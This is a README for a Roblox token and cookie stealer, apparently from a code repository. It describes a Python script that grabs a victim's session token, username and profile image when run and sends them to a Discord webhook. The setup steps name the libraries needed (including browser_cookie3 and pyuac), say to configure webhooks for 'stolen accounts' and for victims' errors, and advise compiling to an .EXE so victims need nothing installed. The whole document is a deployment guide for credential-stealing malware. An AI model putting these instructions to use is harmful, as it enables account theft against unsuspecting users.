# Roblox Token/Cookie Stealer!

What it can do - It can steal a users token, username, and profile_image once the .EXE or .PY file is ran, and it sends it to a Discord Server. 

# COOL FEATURES - If an error is to occour, it will be sent to DISCORDWEBHOOKURL_ERROR.

# What I recomend - I recomend, having the .EXE version. It wont require the victim/user to install any librarys, or Python. Here is the documentation - https://pypi.org/project/auto-py-to-exe/

 Setup - 

 1. Install Python, and install Roblox_INFO_SECURITY/BadRatRobloxStealer.py, then you need to install all the libarys if you don't already have them.

  NEEDED LIBRARYS

  import browser_cookie3
  import pyuac
  import subprocess
  import requests
  import json
  import robloxpy
  from discord_webhook import DiscordWebhook

2. You need to set DISCORDWEBHOOKURL, AND DISCORDWEBHOOKURL_ERRROR

  DiscordWebhookURL = your main channel for recieving stolen accounts
  DiscordWebhookURL_ERROR = your error channel for recieving errors a victim/user runs into

3. You then lastly need to convert it to an .EXE file for best results. I recomend using auto_py_to_exe

4. # auto_py_to_exe DOCUMENTATION = https://pypi.org/project/auto-py-to-exe/
